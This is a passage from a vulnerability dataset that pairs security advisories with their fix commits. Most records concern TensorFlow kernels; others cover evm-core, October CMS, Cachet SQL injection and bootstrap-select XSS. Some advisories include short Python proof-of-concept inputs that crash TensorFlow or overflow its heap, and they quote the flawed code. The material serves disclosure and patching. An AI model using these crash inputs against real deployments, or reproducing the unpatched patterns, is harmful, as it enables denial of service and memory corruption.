\",\\n+                                     values_list_in[i].dtype());\\n+    }\\n     if (!TensorShapeUtils::IsVector(values_list_in[i].shape())) {\\n       return errors::InvalidArgument(\\n           \"Input values should be a vector but received shape \",\\n@@ -502,6 +520,11 @@ Status ValidateInput(const OpInputList& indices_list_in,\\n                                    shapes_list_in.size());\\n   }\\n   for (int i = 0; i < size; i++) {\\n+    if (check_type && shapes_list_in[i].dtype() != DT_INT64) {\\n+      return errors::InvalidArgument(\"Input shape should be of type \", DT_INT64,\\n+                                     \" but received \",\\n+                                     shapes_list_in[i].dtype());\\n+    }\\n     if (!TensorShapeUtils::IsVector(shapes_list_in[i].shape())) {\\n       return errors::InvalidArgument(\\n           \"Input shapes should be a vector but received shape \",\\n@@ -517,6 +540,14 @@ Status ValidateInput(const OpInputList& indices_list_in,\\n \\n   \/\/ Validates dense_list_in OpInputList\\n   for (int i = 0; i < dense_list_in.size(); ++i) {\\n+    \/\/ Make sure to avoid the expected type to be string, but input values to be\\n+    \/\/ int64.\\n+    if (check_type && internal_type == DT_STRING &&\\n+        dense_list_in[i].dtype() == DT_INT64) {\\n+      return errors::InvalidArgument(\"Dense inputs should be of internal type \",\\n+                                     internal_type, \" but received \",\\n+                                     dense_list_in[i].dtype());\\n+    }\\n     if (!TensorShapeUtils::IsMatrix(dense_list_in[i].shape())) {\\n       return errors::InvalidArgument(\\n           \"Dense inputs should be a matrix but received shape \",\\n@@ -698,6 +729,7 @@ class SparseCrossOp : public OpKernel {\\n     int64 signed_hash_key_;\\n     OP_REQUIRES_OK(context, context->GetAttr(\"hash_key\", &signed_hash_key_));\\n     hash_key_ = static_cast<uint64>(signed_hash_key_);\\n+    OP_REQUIRES_OK(context, context->GetAttr(\"internal_type\", &internal_type_));\\n   }\\n \\n   void Compute(OpKernelContext* context) override {\\n@@ -711,8 +743,10 @@ class SparseCrossOp : public OpKernel {\\n     OP_REQUIRES_OK(context,\\n                    context->input_list(\"dense_inputs\", &dense_list_in));\\n \\n-    OP_REQUIRES_OK(context, ValidateInput(indices_list_in, values_list_in,\\n-                                          shapes_list_in, dense_list_in));\\n+    DataType internal_type = internal_type_;\\n+    OP_REQUIRES_OK(\\n+        context, ValidateInput(indices_list_in, values_list_in, shapes_list_in,\\n+                               dense_list_in, internal_type));\\n \\n     std::vector<std::unique_ptr<ColumnInterface<InternalType>>> columns =\\n         GenerateColumnsFromInput<InternalType>(indices_list_in, values_list_in,\\n@@ -756,6 +790,7 @@ class SparseCrossOp : public OpKernel {\\n  private:\\n   int64 num_buckets_;\\n   uint64 hash_key_;\\n+  DataType internal_type_;\\n };\\n \\n class SparseCrossV2Op : public OpKernel {\\n@@ -773,8 +808,11 @@ class SparseCrossV2Op : public OpKernel {\\n     OP_REQUIRES_OK(context,\\n                    context->input_list(\"dense_inputs\", &dense_list_in));\\n \\n-    OP_REQUIRES_OK(context, ValidateInput(indices_list_in, values_list_in,\\n-                                          shapes_list_in, dense_list_in));\\n+    \/\/ Set internal_type to invalid_type so that the check will be ignored.\\n+    DataType internal_type = DT_INVALID;\\n+    OP_REQUIRES_OK(\\n+        context, ValidateInput(indices_list_in, values_list_in, shapes_list_in,\\n+                               dense_list_in, internal_type));\\n \\n     const Tensor* sep_t;\\n     OP_REQUIRES_OK(context, context->input(\"sep\", &sep_t));\\n@@ -832,8 +870,11 @@ class SparseCrossHashedOp : public OpKernel {\\n     OP_REQUIRES_OK(context,\\n                    context->input_list(\"dense_inputs\", &dense_list_in));\\n \\n-    OP_REQUIRES_OK(context, ValidateInput(indices_list_in, values_list_in,\\n-                                          shapes_list_in, dense_list_in));\\n+    \/\/ Set internal_type to invalid_type so that the check will be ignored.\\n+    DataType internal_type = DT_INVALID;\\n+    OP_REQUIRES_OK(\\n+        context, ValidateInput(indices_list_in, values_list_in, shapes_list_in,\\n+                               dense_list_in, internal_type));\\n \\n     const Tensor* num_buckets_t;\\n     OP_REQUIRES_OK(context, context->input(\"num_buckets\", &num_buckets_t));'}}","message_norm":"fix `tf.raw_ops.sparsecross` failing check.\n\npiperorigin-revid: 368701671\nchange-id: id805729dd9ba0bda36e4bb309408129b55fb649d","language":"en","entities":"[('fix', 'ACTION', ''), ('368701671', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_cross_op.cc'])","num_files":1.0},{"index":984,"vuln_id":"GHSA-772p-x54p-hjrv","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/799f835a3dfa00a4d852defa29b15841eea9d64f'}","dataset":"osv","summary":"Division by zero in `Conv3D` ### Impact\nA malicious user could trigger a division by 0 in `Conv3D` implementation:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 56, 56, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 23, 1])\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/42033603003965bffac51ae171b51801565e002d\/tensorflow\/core\/kernels\/conv_ops_3d.cc#L143-L145) does a modulo operation based on user controlled input:\n\n```cc\n  const int64 out_depth = filter.dim_size(4);\n  OP_REQUIRES(context, in_depth % filter_depth == 0, ...);\n```\n\nThus, when `filter` has a 0 as the fifth element, this results in a division by 0.\n\nAdditionally, if the shape of the two tensors is not valid, an Eigen assertion can be triggered, resulting in a program crash:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 39, 34, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])\n```\n\nThe shape of the two tensors must follow the constraints specified in the [op description](https:\/\/www.tensorflow.org\/api_docs\/python\/tf\/raw_ops\/Conv3D).\n\n### Patches\nWe have patched the issue in GitHub commit [799f835a3dfa00a4d852defa29b15841eea9d64f](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/799f835a3dfa00a4d852defa29b15841eea9d64f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/799f835a3dfa00a4d852defa29b15841eea9d64f","commit_sha":"799f835a3dfa00a4d852defa29b15841eea9d64f","patch":"SINGLE","chain_ord":"['799f835a3dfa00a4d852defa29b15841eea9d64f']","before_first_fix_commit":"{'42033603003965bffac51ae171b51801565e002d'}","last_fix_commit":"799f835a3dfa00a4d852defa29b15841eea9d64f","chain_ord_pos":1.0,"commit_datetime":"04\/19\/2021, 16:56:46","message":"Fix 2 issues with `Conv3D`.\n\nWe have an issue where the dimensions are not matching and this causes Eigen to crash on an assert.\n\nThen, we have an issue where we accidentally do a division by 0.\n\nPiperOrigin-RevId: 369242785\nChange-Id: Ie94067b2d41f58699af99ebb5af335ad9defd931","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 7, 'deletions': 0, 'total': 7}","files":"{'tensorflow\/core\/kernels\/conv_ops_3d.cc': {'additions': 7, 'deletions': 0, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/799f835a3dfa00a4d852defa29b15841eea9d64f\/tensorflow%2Fcore%2Fkernels%2Fconv_ops_3d.cc', 'patch': '@@ -69,6 +69,11 @@ struct LaunchConvOp<CPUDevice, T> {\\n                 errors::InvalidArgument(\"CPU implementation of Conv3D \"\\n                                         \"currently only supports dilated rates \"\\n                                         \"of 1.\"));\\n+    OP_REQUIRES(context, filter.dim_size(3) == input.dim_size(input.dims() - 1),\\n+                errors::InvalidArgument(\\n+                    \"Number of channels in filter (\", filter.dim_size(3),\\n+                    \") must match last dimension of input (\",\\n+                    input.dim_size(input.dims() - 1), \")\"));\\n     functor::CuboidConvolution<CPUDevice, T>()(\\n         context->eigen_device<CPUDevice>(), output->tensor<T, 5>(),\\n         input.tensor<T, 5>(), filter.tensor<T, 5>(), strides[2], strides[1],\\n@@ -142,6 +147,8 @@ class Conv3DOp : public BinaryOp<T> {\\n     const int64 filter_depth = filter.dim_size(3);\\n     const int64 out_depth = filter.dim_size(4);\\n \\n+    OP_REQUIRES(context, filter_depth != 0,\\n+                errors::InvalidArgument(\"filter_depth must be non-zero\"));\\n     OP_REQUIRES(context, in_depth % filter_depth == 0,\\n                 errors::InvalidArgument(\\n                     \"Input depth must be evenly divisible by filter depth: \",'}}","message_norm":"fix 2 issues with `conv3d`.\n\nwe have an issue where the dimensions are not matching and this causes eigen to crash on an assert.\n\nthen, we have an issue where we accidentally do a division by 0.\n\npiperorigin-revid: 369242785\nchange-id: ie94067b2d41f58699af99ebb5af335ad9defd931","language":"en","entities":"[('fix', 'ACTION', ''), ('issues', 'FLAW', ''), ('issue', 'FLAW', ''), ('issue', 'FLAW', ''), ('division by 0', 'SECWORD', ''), ('369242785', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/conv_ops_3d.cc'])","num_files":1.0},{"index":987,"vuln_id":"GHSA-773q-5334-5gf9","cwe_id":"{'CWE-789'}","score":0.0,"chain":"{'https:\/\/github.com\/rust-blockchain\/evm\/commit\/19ade858c430ab13eb562764a870ac9f8506f8dd'}","dataset":"osv","summary":"Memory over-allocation in evm-core Prior to the patch, when executing specific EVM opcodes related\nto memory operations that use `evm_core::Memory::copy_large`, the\ncrate can over-allocate memory when it is not needed, making it\npossible for an attacker to perform denial-of-service attack.\n\nThe flaw was corrected in commit `19ade85`.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/rust-blockchain\/evm","commit_href":"https:\/\/github.com\/rust-blockchain\/evm\/commit\/19ade858c430ab13eb562764a870ac9f8506f8dd","commit_sha":"19ade858c430ab13eb562764a870ac9f8506f8dd","patch":"SINGLE","chain_ord":"['19ade858c430ab13eb562764a870ac9f8506f8dd']","before_first_fix_commit":"{'2a8a3e967ec265fdc7120ff6b57ceab021ca69f6'}","last_fix_commit":"19ade858c430ab13eb562764a870ac9f8506f8dd","chain_ord_pos":1.0,"commit_datetime":"05\/11\/2021, 15:33:30","message":"Skip setting memory value if the value vec is empty","author":"Wei Tang","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'core\/src\/memory.rs': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rust-blockchain\/evm\/raw\/19ade858c430ab13eb562764a870ac9f8506f8dd\/core%2Fsrc%2Fmemory.rs', 'patch': '@@ -105,6 +105,10 @@ impl Memory {\\n \\t\\tvalue: &[u8],\\n \\t\\ttarget_size: Option<usize>\\n \\t) -> Result<(), ExitFatal> {\\n+\\t\\tif value.is_empty() {\\n+\\t\\t\\treturn Ok(())\\n+\\t\\t}\\n+\\t\\t\\n \\t\\tlet target_size = target_size.unwrap_or(value.len());\\n \\n \\t\\tif offset.checked_add(target_size)'}}","message_norm":"skip setting memory value if the value vec is empty","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/src\/memory.rs'])","num_files":1.0},{"index":992,"vuln_id":"GHSA-77gp-3h4r-6428","cwe_id":"{'CWE-787', 'CWE-125'}","score":8.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0657c83d08845cc434175934c642299de2c0f042'}","dataset":"osv","summary":"Out of bounds read and write in Tensorflow ### Impact\nThere is a typo in TensorFlow's [`SpecializeType`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/framework\/full_type_util.cc#L81-L102) which results in heap OOB read\/write:\n\n```cc\nfor (int i = 0; i < op_def.output_arg_size(); i++) {\n  \/\/ ...\n  for (int j = 0; j < t->args_size(); j++) {\n    auto* arg = t->mutable_args(i);\n    \/\/ ...\n  }\n} \n```\n\nDue to a typo, `arg` is initialized to the `i`th mutable argument in a loop where the loop index is `j`. Hence it is possible to assign to `arg` from outside the vector of arguments. Since this is a mutable proto value, it allows both read and write to outside of bounds data.\n\n### Patches\nWe have patched the issue in GitHub commit [0657c83d08845cc434175934c642299de2c0f042](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0657c83d08845cc434175934c642299de2c0f042).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0657c83d08845cc434175934c642299de2c0f042","commit_sha":"0657c83d08845cc434175934c642299de2c0f042","patch":"SINGLE","chain_ord":"['0657c83d08845cc434175934c642299de2c0f042']","before_first_fix_commit":"{'6e65b0b4ad12fdaa223e87b4ae6d8cb762fcae2b'}","last_fix_commit":"0657c83d08845cc434175934c642299de2c0f042","chain_ord_pos":1.0,"commit_datetime":"11\/09\/2021, 12:44:43","message":"Fix heap OOB read\/write due to incorrect indexing.\n\nPiperOrigin-RevId: 408578046\nChange-Id: Ifc9ffea49e5890f55fcb2c27568611052c3ddcfa","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'tensorflow\/core\/framework\/full_type_util.cc': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/0657c83d08845cc434175934c642299de2c0f042\/tensorflow%2Fcore%2Fframework%2Ffull_type_util.cc', 'patch': '@@ -100,7 +100,7 @@ StatusOr<FullTypeDef> SpecializeType(const AttrSlice& attrs,\\n     \/\/ verifications are needed, they should be done by separately, and in a\\n     \/\/ way that can be reused for type inference.\\n     for (int j = 0; j < t->args_size(); j++) {\\n-      auto* arg = t->mutable_args(i);\\n+      auto* arg = t->mutable_args(j);\\n       if (arg->type_id() == TFT_VAR) {\\n         const auto* attr = attrs.Find(arg->s());\\n         if (attr == nullptr) {'}}","message_norm":"fix heap oob read\/write due to incorrect indexing.\n\npiperorigin-revid: 408578046\nchange-id: ifc9ffea49e5890f55fcb2c27568611052c3ddcfa","language":"en","entities":"[('fix', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('408578046', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/framework\/full_type_util.cc'])","num_files":1.0},{"index":998,"vuln_id":"GHSA-786j-5qwq-r36x","cwe_id":"{'CWE-824'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/7731e8dfbe4a56773be5dc94d631611211156659'}","dataset":"osv","summary":"Segfault while copying constant resource tensor ### Impact\nDuring TensorFlow's Grappler optimizer phase, constant folding might attempt to deep copy a resource tensor. This results in a segfault, as these tensors are supposed to not change.\n\n### Patches\nWe have patched the issue in GitHub commit [7731e8dfbe4a56773be5dc94d631611211156659](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/7731e8dfbe4a56773be5dc94d631611211156659).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions","published_date":"2021-11-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/7731e8dfbe4a56773be5dc94d631611211156659","commit_sha":"7731e8dfbe4a56773be5dc94d631611211156659","patch":"SINGLE","chain_ord":"['7731e8dfbe4a56773be5dc94d631611211156659']","before_first_fix_commit":"{'a813a3f1631e9c0e0e0cc3032349a03a6041526c'}","last_fix_commit":"7731e8dfbe4a56773be5dc94d631611211156659","chain_ord_pos":1.0,"commit_datetime":"08\/19\/2021, 18:25:32","message":"Don't constant-fold DT_RESOURCE constants.\n\nPiperOrigin-RevId: 391803952\nChange-Id: I0ea3ec31d3e7dfda0f03b4027a237f08d00a3091","author":"A. Unique TensorFlower","comments":null,"stats":"{'additions': 3, 'deletions': 1, 'total': 4}","files":"{'tensorflow\/core\/common_runtime\/constant_folding.cc': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/7731e8dfbe4a56773be5dc94d631611211156659\/tensorflow%2Fcore%2Fcommon_runtime%2Fconstant_folding.cc', 'patch': '@@ -30,6 +30,7 @@ limitations under the License.\\n #include \"tensorflow\/core\/framework\/log_memory.h\"\\n #include \"tensorflow\/core\/framework\/op_kernel.h\"\\n #include \"tensorflow\/core\/framework\/types.h\"\\n+#include \"tensorflow\/core\/framework\/types.pb.h\"\\n #include \"tensorflow\/core\/graph\/algorithm.h\"\\n #include \"tensorflow\/core\/graph\/node_builder.h\"\\n #include \"tensorflow\/core\/graph\/subgraph.h\"\\n@@ -223,7 +224,8 @@ bool IsConstantFoldable(\\n     std::unordered_map<const Node*, std::vector<Tensor>>*\\n         shape_replacement_map) {\\n   if (n->IsConstant()) {\\n-    return true;\\n+    \/\/ Skip constant folding resources as they cannot be deep copied.\\n+    return n->output_type(0) != DT_RESOURCE;\\n   }\\n   if (MaybeReplaceShapeOp(n, shape_map, shape_replacement_map)) {\\n     return true;'}}","message_norm":"don't constant-fold dt_resource constants.\n\npiperorigin-revid: 391803952\nchange-id: i0ea3ec31d3e7dfda0f03b4027a237f08d00a3091","language":"ca","entities":"[('391803952', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/common_runtime\/constant_folding.cc'])","num_files":1.0},{"index":1003,"vuln_id":"GHSA-79fv-9865-4qcv","cwe_id":"{'CWE-787', 'CWE-119'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a74768f8e4efbda4def9f16ee7e13cf3922ac5f7'}","dataset":"osv","summary":"Heap buffer overflow in `MaxPoolGrad` ### Impact\nThe implementation of `tf.raw_ops.MaxPoolGrad` is vulnerable to a heap buffer overflow:\n  \n```python\nimport tensorflow as tf\n\norig_input = tf.constant([0.0], shape=[1, 1, 1, 1], dtype=tf.float32)\norig_output = tf.constant([0.0], shape=[1, 1, 1, 1], dtype=tf.float32)\ngrad = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nksize = [1, 1, 1, 1] \nstrides = [1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.MaxPoolGrad(\n  orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,\n  strides=strides, padding=padding, explicit_paddings=[])\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/ab1e644b48c82cb71493f4362b4dd38f4577a1cf\/tensorflow\/core\/kernels\/maxpooling_op.cc#L194-L203) fails to validate that indices used to access elements of input\/output arrays are valid:\n\n```cc\nfor (int index = out_start; index < out_end; ++index) {\n  int input_backprop_index = out_arg_max_flat(index);\n  FastBoundsCheck(input_backprop_index - in_start, in_end - in_start);\n  input_backprop_flat(input_backprop_index) += out_backprop_flat(index);\n}\n```\n\nWhereas accesses to `input_backprop_flat` are guarded by `FastBoundsCheck`, the indexing in `out_backprop_flat` can result in OOB access.\n\n### Patches\nWe have patched the issue in GitHub commit [a74768f8e4efbda4def9f16ee7e13cf3922ac5f7](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a74768f8e4efbda4def9f16ee7e13cf3922ac5f7).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a74768f8e4efbda4def9f16ee7e13cf3922ac5f7","commit_sha":"a74768f8e4efbda4def9f16ee7e13cf3922ac5f7","patch":"SINGLE","chain_ord":"['a74768f8e4efbda4def9f16ee7e13cf3922ac5f7']","before_first_fix_commit":"{'ab1e644b48c82cb71493f4362b4dd38f4577a1cf'}","last_fix_commit":"a74768f8e4efbda4def9f16ee7e13cf3922ac5f7","chain_ord_pos":1.0,"commit_datetime":"05\/06\/2021, 21:24:09","message":"Prevent heap OOB error in `MaxPoolGrad`\n\nPiperOrigin-RevId: 372424854\nChange-Id: Idac0f23867ad8b0601cafbaaa52d5e64269e63a7","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 1, 'total': 4}","files":"{'tensorflow\/core\/kernels\/maxpooling_op.cc': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/a74768f8e4efbda4def9f16ee7e13cf3922ac5f7\/tensorflow%2Fcore%2Fkernels%2Fmaxpooling_op.cc', 'patch': '@@ -199,7 +199,9 @@ static void SpatialMaxPoolWithArgMaxHelper(\\n         \/\/ CHECK(input_backprop_index >= in_start && input_backprop_index <\\n         \/\/ in_end)\\n         FastBoundsCheck(input_backprop_index - in_start, in_end - in_start);\\n-        input_backprop_flat(input_backprop_index) += out_backprop_flat(index);\\n+        if (index < out_backprop.NumElements()) {\\n+          input_backprop_flat(input_backprop_index) += out_backprop_flat(index);\\n+        }\\n       }\\n     }\\n   };'}}","message_norm":"prevent heap oob error in `maxpoolgrad`\n\npiperorigin-revid: 372424854\nchange-id: idac0f23867ad8b0601cafbaaa52d5e64269e63a7","language":"nl","entities":"[('prevent', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('error', 'FLAW', ''), ('372424854', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/maxpooling_op.cc'])","num_files":1.0},{"index":1004,"vuln_id":"GHSA-79jw-2f46-wv22","cwe_id":"{'CWE-74'}","score":7.2,"chain":"{'https:\/\/github.com\/octobercms\/library\/commit\/c393c5ce9ca2c5acc3ed6c9bb0dab5ffd61965fe'}","dataset":"osv","summary":"Authenticated remote code execution in October CMS ### Impact\n\nAn authenticated user with the permissions to create, modify and delete website pages can exploit this vulnerability to bypass  `cms.safe_mode` \/ `cms.enableSafeMode` in order to execute arbitrary code.\n\n- This issue only affects admin panels that rely on safe mode and restricted permissions.\n- To exploit this vulnerability, an attacker must first have access to the backend area.\n\n### Patches\n\nThe issue has been patched in Build 474 (v1.0.474) and v1.1.10.\n\n### Workarounds\n\nApply https:\/\/github.com\/octobercms\/library\/commit\/c393c5ce9ca2c5acc3ed6c9bb0dab5ffd61965fe to your installation manually if unable to upgrade to Build 474 or v1.1.10.\n\n### References\n\nCredits to:\n- David Miller\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n- Email us at [hello@octobercms.com](mailto:hello@octobercms.com)","published_date":"2022-02-23","chain_len":1,"project":"https:\/\/github.com\/octobercms\/library","commit_href":"https:\/\/github.com\/octobercms\/library\/commit\/c393c5ce9ca2c5acc3ed6c9bb0dab5ffd61965fe","commit_sha":"c393c5ce9ca2c5acc3ed6c9bb0dab5ffd61965fe","patch":"SINGLE","chain_ord":"['c393c5ce9ca2c5acc3ed6c9bb0dab5ffd61965fe']","before_first_fix_commit":"{'8f06437ab772b48dd7ea7079c293f436438f867d'}","last_fix_commit":"c393c5ce9ca2c5acc3ed6c9bb0dab5ffd61965fe","chain_ord_pos":1.0,"commit_datetime":"01\/20\/2022, 00:25:32","message":"Backport fix from 2.0","author":"Samuel Georges","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'src\/Halcyon\/Processors\/SectionParser.php': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/octobercms\/library\/raw\/c393c5ce9ca2c5acc3ed6c9bb0dab5ffd61965fe\/src%2FHalcyon%2FProcessors%2FSectionParser.php', 'patch': \"@@ -72,7 +72,8 @@ public static function render($data, $options = [])\\n             }\\n         }\\n \\n-        $content[] = $markup;\\n+        $sections = preg_split('\/^'.preg_quote(self::SECTION_SEPARATOR).'\\\\s*$\/m', $markup, -1);\\n+        $content[] = end($sections);\\n \\n         $content = trim(implode(PHP_EOL.self::SECTION_SEPARATOR.PHP_EOL, $content));\"}}","message_norm":"backport fix from 2.0","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Halcyon\/Processors\/SectionParser.php'])","num_files":1.0},{"index":1006,"vuln_id":"GHSA-79mg-4w23-4fqc","cwe_id":"{'CWE-89', 'CWE-287'}","score":8.1,"chain":"{'https:\/\/github.com\/fiveai\/Cachet\/commit\/27bca8280419966ba80c6fa283d985ddffa84bb6'}","dataset":"osv","summary":"Unauthenticated SQL Injection in Cachet ### Impact\nIn Cachet versions through 2.3.18, there is a SQL injection which is in the `SearchableTrait#scopeSearch()`. Attackers without authentication can utilize this vulnerability to exfiltrate sensitive data from the database such as administrator's password and session.\n\n### Patches\n\nThe original repository of [https:\/\/github.com\/CachetHQ\/Cachet](https:\/\/github.com\/CachetHQ\/Cachet) is not active, the stable version 2.3.18 and it's developing 2.4 branch is affected. \n\nUpdate to version 2.5 or later in the [https:\/\/github.com\/fiveai\/Cachet fork](https:\/\/github.com\/fiveai\/Cachet) to fix this vulnerability.","published_date":"2021-08-30","chain_len":1,"project":"https:\/\/github.com\/fiveai\/Cachet","commit_href":"https:\/\/github.com\/fiveai\/Cachet\/commit\/27bca8280419966ba80c6fa283d985ddffa84bb6","commit_sha":"27bca8280419966ba80c6fa283d985ddffa84bb6","patch":"SINGLE","chain_ord":"['27bca8280419966ba80c6fa283d985ddffa84bb6']","before_first_fix_commit":"{'8c1a2c27d4a46777a78bceefa7f3fee297ebe7be'}","last_fix_commit":"27bca8280419966ba80c6fa283d985ddffa84bb6","chain_ord_pos":1.0,"commit_datetime":"01\/15\/2021, 14:17:35","message":"Ensure only allowed searchable columns are used in DB Query","author":"Seb Dangerfield","comments":null,"stats":"{'additions': 3, 'deletions': 2, 'total': 5}","files":"{'app\/Models\/Traits\/SearchableTrait.php': {'additions': 3, 'deletions': 2, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/fiveai\/Cachet\/raw\/27bca8280419966ba80c6fa283d985ddffa84bb6\/app%2FModels%2FTraits%2FSearchableTrait.php', 'patch': '@@ -34,10 +34,11 @@ public function scopeSearch(Builder $query, array $search = [])\\n             return $query;\\n         }\\n \\n-        if (!array_intersect(array_keys($search), $this->searchable)) {\\n+        $allowed_search = array_intersect_key($search, array_flip($this->searchable));\\n+        if (! $allowed_search) {\\n             return $query;\\n         }\\n \\n-        return $query->where($search);\\n+        return $query->where($allowed_search);\\n     }\\n }'}}","message_norm":"ensure only allowed searchable columns are used in db query","language":"en","entities":"[('ensure', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Models\/Traits\/SearchableTrait.php'])","num_files":1.0},{"index":1009,"vuln_id":"GHSA-7c82-mp33-r854","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/snapappointments\/bootstrap-select\/commit\/ab6e068748040cf3cda5859f6349b382402b8767'}","dataset":"osv","summary":"Cross-site scripting in bootstrap-select bootstrap-select before 1.13.6 allows Cross-Site Scripting (XSS). It does not escape title values in OPTION elements. This may allow attackers to execute arbitrary JavaScript in a victim's browser.","published_date":"2021-05-07","chain_len":1,"project":"https:\/\/github.com\/snapappointments\/bootstrap-select","commit_href":"https:\/\/github.com\/snapappointments\/bootstrap-select\/commit\/ab6e068748040cf3cda5859f6349b382402b8767","commit_sha":"ab6e068748040cf3cda5859f6349b382402b8767","patch":"SINGLE","chain_ord":"['ab6e068748040cf3cda5859f6349b382402b8767']","before_first_fix_commit":"{'bbd306de22fbcede9016cf7e335fd8ce34d6629d'}","last_fix_commit":"ab6e068748040cf3cda5859f6349b382402b8767","chain_ord_pos":1.0,"commit_datetime":"03\/07\/2019, 23:05:50","message":"add sanitize option for data-content (#2199)","author":"Casey Holzer","comments":null,"stats":"{'additions': 167, 'deletions': 6, 'total': 173}","files":"{'js\/bootstrap-select.js': {'additions': 167, 'deletions': 6, 'changes': 173, 'status': 'modified', 'raw_url': 